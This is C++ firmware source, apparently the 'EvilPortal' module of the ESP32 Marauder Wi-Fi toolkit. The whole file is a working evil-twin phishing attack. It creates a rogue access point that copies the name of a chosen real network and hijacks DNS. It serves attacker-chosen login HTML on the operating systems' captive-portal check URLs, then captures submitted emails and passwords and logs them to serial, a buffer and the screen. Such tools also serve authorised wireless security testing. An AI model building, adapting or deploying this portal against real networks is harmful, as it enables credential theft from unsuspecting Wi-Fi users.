#line 1 "C:\\Users\\soyko\\Documents\\esp32_marauder\\ESP32Marauder\\esp32_marauder\\EvilPortal.cpp"
#include "EvilPortal.h"

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

char* index_html = nullptr;

namespace {
bool replacePortalHtml(const char* html, size_t length) {
  if (!html || length >= MAX_HTML_SIZE) return false;

  #ifdef HAS_PSRAM
    char* replacement = static_cast<char*>(ps_malloc(length + 1));
  #else
    char* replacement = static_cast<char*>(malloc(length + 1));
  #endif
  if (!replacement) return false;

  memcpy(replacement, html, length);
  replacement[length] = '\0';
  free(index_html);
  index_html = replacement;
  return true;
}
}

AsyncWebServer server(80);

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      #ifndef MARAUDER_V8
        Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
      #endif
    }
  #endif
}

void EvilPortal::cleanup() {
  this->ap_index = -1;

  // Free the per-activation network resources so repeated Start/Stop cycles don't
  // leak: stop the DNS server (frees its UDP pcb) and tear down the SoftAP netif +
  // DHCP lease pool. Previously cleanup() freed only the PSRAM HTML buffer, so each
  // cycle leaked the DNS socket + AP netif and the web handlers grew unbounded (see
  // the register-once guard in startAP()).
  this->dnsServer.stop();
  WiFi.softAPdisconnect(true);

  free(index_html);
  index_html = nullptr;
  this->has_html = false;
  this->using_serial_html = false;
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;
    
  startPortal();

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/html", index_html ? index_html : "");
    #ifndef MARAUDER_V8
      Serial.println(F("client connected"));
    #endif
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("Client connected to server"));
    #endif
  });

  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
    
    server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
      request->send(200, "text/html", index_html ? index_html : "");
    });
  }

  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      this->user_name = inputMessage;
      this->name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      this->password = inputMessage;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
}

void EvilPortal::setHtmlFromSerial() {
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML from serial..."));
  #endif
  const String html = Serial.readString();
  if (!replacePortalHtml(html.c_str(), html.length())) {
    Serial.println(F("Unable to allocate HTML buffer"));
    return;
  }
  this->has_html = true;
  this->using_serial_html = true;
  #ifndef MARAUDER_V8
    Serial.println("html set");
  #endif
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    #ifndef MARAUDER_V8
      Serial.println(F("html previously set"));
    #endif
    return true;
  }
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML..."));
  #endif
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    #ifndef MARAUDER_V8
      Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    #endif
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided HTML is too large.\nUse stopscan...");
      #endif
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    if (!replacePortalHtml(html.c_str(), html.length())) {
      html_file.close();
      #ifndef MARAUDER_V8
        Serial.println(F("Unable to allocate HTML buffer"));
      #endif
      return false;
    }
    this->has_html = true;
    #ifndef MARAUDER_V8
      Serial.println("html set");
    #endif
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    return this->setAPFromConfig();
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided AP name is too large.\nUse stopscan...");
      #endif
      return false;
    }
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    #ifndef MARAUDER_V8
      Serial.println("AP name from SSID list: " + ap_config);
    #endif
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The given AP name is too large.\nUse stopscan...");
      #endif
    }
    else {
      ap_config = temp_ap_name;
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      #ifndef MARAUDER_V8
        Serial.println("AP name from AP list: " + ap_config);
      #endif
    }
  }
  else {
    #ifndef MARAUDER_V8
      Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #endif
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    #ifndef MARAUDER_V8
      Serial.println(F("ap config set"));
    #endif
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAPFromConfig() {
  #ifdef HAS_SD
    File ap_config_file = sd_obj.getFile("/ap.config.txt");
  #else
    File ap_config_file;
  #endif

  if (!ap_config_file || ap_config_file.size() > MAX_AP_NAME_SIZE) {
    if (ap_config_file)
      ap_config_file.close();
    return false;
  }

  String ap_config = ap_config_file.readString();
  ap_config_file.close();

  if (this->setAP(ap_config)) {
    this->ap_index = -1;
    return true;
  }

  return false;
}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE - 1);
  apName[MAX_AP_NAME_SIZE - 1] = '\0';
  this->has_ap = true;
  #ifndef MARAUDER_V8
    Serial.println(F("ap config set"));
  #endif
  return true;
}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  #ifndef MARAUDER_V8
    Serial.print(F("ap ip address: "));
    Serial.println(WiFi.softAPIP());
  #endif

  // Register the web-server endpoints + captive handler ONCE for the app lifetime.
  // setupServer() appends ~12 handlers and addHandler() allocates a
  // CaptiveRequestHandler; re-running them on every Start leaked those per activation
  // (server._handlers grew unbounded). They are owned by the global `server` and this
  // is the singleton evil_portal_obj, so once is enough; server.begin() is idempotent.
  // The AP + DNS themselves ARE rebuilt each Start (cleanup() tears them down).
  static bool s_server_registered = false;
  if (!s_server_registered) {
    this->setupServer();
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    s_server_registered = true;
  }

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  #ifndef MARAUDER_V8
    Serial.println(F("Evil Portal READY"));
  #endif
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    // Portal HTML lives in internal heap on no-PSRAM targets and can put the
    // general allocation guard into pressure mode. Keep these bounded status
    // and credential lines visible while still respecting queue backpressure.
    display_obj.queueCriticalLine(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  if (this->name_received && this->password_received) {
    this->name_received = false;
    this->password_received = false;

    // Adjust size depending on your max username/password length
    char line[96];

    // If user_name / password are still Arduino String:
    snprintf(line, sizeof(line),
             "u: %s p: %s\n",
             this->user_name.c_str(),
             this->password.c_str());

    Serial.print(line);
    buffer_obj.append(line);
    #ifdef HAS_SCREEN
        this->sendToDisplay(line);
    #endif
  }
}
